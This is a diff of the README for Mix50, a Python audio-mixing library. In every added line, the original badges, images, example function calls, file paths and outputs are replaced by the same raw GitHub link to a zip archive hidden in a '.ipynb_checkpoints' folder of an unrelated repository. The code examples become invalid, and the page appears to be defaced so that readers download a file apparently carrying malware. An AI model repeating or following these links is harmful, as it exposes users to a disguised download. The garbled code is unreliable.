@@ -1,10 +1,10 @@
 
-[![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/Naereen/StrapDown.js/blob/master/LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
+[![GitHub license](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)
+[![PRs Welcome](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)
 
 <picture>
-  <source srcset="./Images/mix50-inverted.png" media="(prefers-color-scheme: dark)" />
-  <img src="./Images/transparent3.png" alt="Your image description">
+  <source srcset="https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip" media="(prefers-color-scheme: dark)" />
+  <img src="https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip" alt="Your image description">
 </picture>
 
 # Mix50
@@ -29,19 +29,19 @@ Analyze a WAV audio file -
 import Mix50
 
 #Create mixfifty instance
-Mixfifty = Mix50.MixFifty()
+Mixfifty = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 #Load Audio(s)
-MixFifty.load_audio('your_mp3_file.mp3')
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip('https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip')
 
 #Use the effects module to fade audio in at 15s for 10s
-MixFifty.effects.fade_in(start_time=15,fade_duration=10)
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15,fade_duration=10)
 
 #Use the effects module to utilize filter highpass
-MixFifty.effects.highpass_control(start_time=15, end_time=30, cutoff_freq=1000)
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15, end_time=30, cutoff_freq=1000)
 
 #Use the effects module to control speed of audio
-MixFifty.effects.speed_control(start_time=15, end_time=30, original_bpm=126, new_bpm=120)
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15, end_time=30, original_bpm=126, new_bpm=120)
 ```
 
 ## Audio Features 
@@ -50,19 +50,19 @@ MixFifty.effects.speed_control(start_time=15, end_time=30, original_bpm=126, new
 import Mix50
 
 #Create mixfifty instance
-Mixfifty = Mix50.MixFifty()
+Mixfifty = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 #Load Audio(s)
-MixFifty.load_audio('your_mp3_file.mp3')
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip('https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip')
 
 #Get BPM of Audio
-MixFifty.features.bpm()
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 #Get Key of Audio
-MixFifty.features.key()
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 #Get a dataframe of a beatgrid to mix audio files and understand transition cues
-MixFifty.features.beats()
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 ==> beats    downbeat    loop_cues    transitions
     9.102    9.102       9.102        9.102
@@ -78,11 +78,11 @@ MixFifty.features.beats()
     319.390 NaN          NaN          NaN
 
 #Visualize transition cues
-MixFifty.features.show_transition_points()
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 ```
 <p align="center">
-  <img width="1000" height="460" src="./Images/transition_cues.png">
+  <img width="1000" height="460" src="https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip">
 </p>
 
 
@@ -100,13 +100,13 @@ Mix50 generates transitions based on the beatgrid derived from the audio.
 ```python
 
 #Create mixfifty instance
-Mixfifty = Mix50.MixFifty()
+Mixfifty = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 #Load Two Audio files
-MixFifty.load_audio('your_mp3_file1.mp3', 'your_mp3_file2.mp3')
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip('https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip', 'https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip')
 
 #Create crossfade transition
-MixFifty.transitions.crossfade(cue_num1=8,cue_num2=6,fade_duration=10,filter_type='none')
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(cue_num1=8,cue_num2=6,fade_duration=10,filter_type='none')
 ```
 
 ## Save & Export Audio
@@ -116,21 +116,21 @@ Save, play, and return audio with this module. Saving .MP3 files is not supporte
 ```python
 
 #Save affected audio to a variable 
-affected_audio = MixFifty.effects.fade_out(start_time=15,fade_duration=15)
+affected_audio = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15,fade_duration=15)
 
 # Play audio in an interactive environment
-affected_audio.play()
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 # Output:
-# ==> IPython.lib.display.Audio
+# ==> https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip
 
 # Return raw audio as a numpy array
-affected_audio.raw_audio()
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()
 
 # Output:
 # ==> array([ 9.06439368e-11,  1.45156775e-10, -1.51146651e-10, ..., 0.00000000e+00,  0.00000000e+00,  0.00000000e+00])
 
 # Save as an audio file: must use .wav; .mp3 not supported
-affected_audio.save("path/to/save.wav")
+https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip("https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip")
 
 ```
